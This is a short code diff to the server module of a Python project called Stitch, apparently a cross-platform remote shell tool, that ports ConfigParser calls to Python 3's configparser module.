@@ -2,6 +2,7 @@
 # Copyright (c) 2017, Nathan Lopez
 # Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.
 
+import configparser
 from . import stitch_winshell
 from . import stitch_osxshell
 from . import stitch_lnxshell
@@ -20,9 +21,9 @@ class stitch_server(cmd.Cmd):
     def __init__(self):
         cmd.Cmd.__init__(self)
         path_name = get_cwd()
-        self.Config = ConfigParser.ConfigParser()
+        self.Config = configparser.ConfigParser()
         self.Config.read(hist_ini)
-        self.aes_lib = ConfigParser.ConfigParser()
+        self.aes_lib = configparser.ConfigParser()
         self.aes_lib.read(st_aes_lib)
         self.prompt = "{} {} ".format(st_tag,path_name)
         display_banner()
